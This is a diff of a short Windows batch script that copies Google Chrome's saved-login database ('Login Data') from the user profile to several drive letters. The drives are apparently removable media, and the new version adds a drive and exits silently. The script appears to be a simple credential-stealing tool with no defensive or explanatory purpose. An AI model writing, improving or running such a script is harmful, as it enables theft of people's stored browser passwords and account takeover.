@@ -1,9 +1,8 @@
-
 color a
 cls
-cd "%localappdata%\Google\Chrome\User Data\Default"
-copy "login data" F:
-copy "login data" E:
-copy "login data" G:
-copy "login data" D:
-pause
+copy "%localappdata%\Google\Chrome\User Data\Default\login data" F:
+copy "%localappdata%\Google\Chrome\User Data\Default\login data" E:
+copy "%localappdata%\Google\Chrome\User Data\Default\login data" G:
+copy "%localappdata%\Google\Chrome\User Data\Default\login data" D:
+copy "%localappdata%\Google\Chrome\User Data\Default\login data" H:
+exit
